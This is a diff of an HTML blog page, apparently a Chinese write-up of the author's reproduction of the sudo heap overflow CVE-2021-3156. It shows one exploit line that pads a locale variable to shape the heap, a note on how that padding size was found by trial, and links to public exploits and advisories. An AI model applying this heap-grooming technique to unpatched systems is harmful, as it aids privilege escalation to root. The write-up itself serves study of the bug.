 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">memset</span><span class="token punctuation">(</span>LC1 <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>LC_ENV1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>至于 0xc0 这个值是怎么来的？本人是 <strong>从 0 开始间隔 0x10 递增</strong>，观察堆的情况，一步步地测出来的</p>
 <p>目前公开的文章也并没有做一个很好的解释，具体怎么回事，还是得跟踪调试 setlocale 的每一次 malloc 和 free 的调用了，写得比较好的 exp 是 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/blasty/CVE-2021-3156">blasty</a> 的 exp，其中提供了一个爆破脚本，就是为了测出这个合适的值</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是我接触的第一个 CVE，漏洞原理相对还是比较简单的，从中也学到了 <strong>NSS</strong> 这个十分有意思的机制</p>
+<h2 id="总结">总结</h2>
+<p>这是我接触的第一个 CVE，漏洞原理相对还是比较简单的，从中也学到了 <strong>NSS</strong> 这个十分有意思的机制</p>
 <p>最近在学 v8 的漏洞利用，下一次复现的就是 v8 的 CVE 了，加油！</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<h2 id="参考">参考</h2>
+<ul>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</a></li>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://ama2in9.top/2021/02/04/cve-2021-3156/">https://ama2in9.top/2021/02/04/cve-2021-3156/</a></li>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://mp.weixin.qq.com/s/zyeCBsLNRVdg2ckFnOXENg">https://mp.weixin.qq.com/s/zyeCBsLNRVdg2ckFnOXENg</a></li>
@@ -996,13 +984,13 @@ systemd(service_user)
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">380k</span>
+    <span title="站点总字数">379k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">5:46</span>
+    <span title="站点阅读时长">5:45</span>
   </span>
 </div>
 <div class="busuanzi-count">
